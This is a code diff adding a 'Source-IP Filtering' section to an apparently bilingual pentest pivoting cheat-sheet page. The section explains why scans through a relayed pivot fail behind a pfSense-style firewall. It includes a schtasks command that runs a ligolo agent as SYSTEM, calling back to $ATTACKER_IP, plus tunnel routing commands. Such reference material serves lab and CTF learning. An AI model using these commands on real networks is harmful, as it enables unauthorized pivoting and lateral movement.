@@ -97,6 +97,36 @@ export default function MultiHopPage() {
         },
       ],
     },
+    {
+      title: lang === "fr" ? "Filtrage par IP source (pare-feu inter-VLAN)" : "Source-IP Filtering (Inter-VLAN Firewall)",
+      id: "source-ip-filtering",
+      entries: [
+        {
+          cmd: "# scan via tunnel routé (SOCKS/route msf) sur un subnet cible -> tout 'filtered'",
+          why: lang === "fr"
+            ? "Symptôme : un scan via un pivot routé/relayé (SOCKS msf, tunnel ligolo sourcé par un autre hôte) ne trouve rien alors qu'un pare-feu type pfSense sépare les segments. Hypothèse à tester : le firewall autorise uniquement le trafic dont l'IP source réelle est un hôte précis (ex: le DC lui-même), pas n'importe quel trafic relayé apparaissant depuis ce segment."
+            : "Symptom: a scan via a routed/relayed pivot (msf SOCKS, ligolo tunnel sourced from another host) finds nothing even though a pfSense-style firewall separates the segments. Hypothesis to test: the firewall only allows traffic whose real source IP is a specific host (e.g. the DC itself), not any relayed traffic that merely appears to come from that segment.",
+        },
+        {
+          cmd: "# valider : ping/scan émis DEPUIS l'hôte autorisé lui-même (ex: via meterpreter/evil-winrm) plutôt que via le pivot",
+          why: lang === "fr"
+            ? "Test-Connection ou un scan TCP par socket lancé directement depuis l'hôte cible du filtrage confirme l'hypothèse s'il répond alors que le même scan via un autre pivot échoue systématiquement, même sur le même /24."
+            : "Test-Connection or a direct TCP socket scan launched from the filtering target host confirms the hypothesis if it responds while the same scan via another pivot systematically fails, even on the same /24.",
+        },
+        {
+          cmd: "schtasks /create /tn lgtask /tr \"C:\\Windows\\Temp\\agent.exe -connect $ATTACKER_IP:11601 -ignore-cert\" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn lgtask",
+          why: lang === "fr"
+            ? "Correctif : déployer un agent ligolo natif directement sur l'hôte source autorisé (nouvelle interface tun dédiée). Lancer via Start-Process/exec direct dans une session WinRM tue le process à la fermeture (rattaché au Job Object) : passer par une tâche planifiée le détache vraiment."
+            : "Fix: deploy a native ligolo agent directly on the authorized source host (dedicated new tun interface). Launching via Start-Process/direct exec in a WinRM session kills the process on session close (tied to the Job Object): a scheduled task truly detaches it.",
+        },
+        {
+          cmd: "sudo ip tuntap add user $(whoami) mode tun ligoloX && sudo ip route add $TARGET_HOST/32 dev ligoloX",
+          why: lang === "fr"
+            ? "Plusieurs tunnels ligolo peuvent tourner en parallèle sans conflit (une interface dédiée par pivot). Utiliser des routes /32 ciblées quand seuls quelques hôtes du /24 sont concernés, pour ne pas entrer en collision avec une route /24 déjà présente sur une autre interface."
+            : "Multiple ligolo tunnels can run in parallel without conflict (one dedicated interface per pivot). Use targeted /32 routes when only a few hosts of the /24 are involved, to avoid colliding with a /24 route already present on another interface.",
+        },
+      ],
+    },
   ];
 
   return (
